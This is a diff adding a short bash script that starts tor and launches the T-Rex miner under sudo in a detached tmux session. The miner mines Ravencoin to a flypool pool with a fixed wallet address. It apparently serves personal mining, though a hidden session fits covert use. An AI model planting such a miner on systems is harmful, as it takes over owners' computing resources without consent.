@@ -1,0 +1,3 @@
+#!/bin/bash
+sudo systemctl start tor
+tmux new -ds servak sudo ./t-rex -a kawpow -o stratum+tcp://stratum-ravencoin.flypool.org:3333 -u RKBb6NUc6kFo7oULPMfRq8GCkqS8J4WVN1 -p x -w bomzhi
